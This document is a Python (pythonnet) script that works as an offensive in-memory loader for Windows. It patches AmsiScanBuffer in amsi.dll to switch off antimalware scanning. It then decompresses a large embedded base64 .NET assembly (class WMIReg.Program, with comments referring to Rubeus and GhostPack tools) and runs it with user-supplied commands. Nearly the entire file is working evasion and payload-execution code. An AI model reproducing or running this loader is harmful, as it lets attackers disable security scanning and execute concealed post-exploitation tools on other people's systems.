import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("WMIReg.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str](command)
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()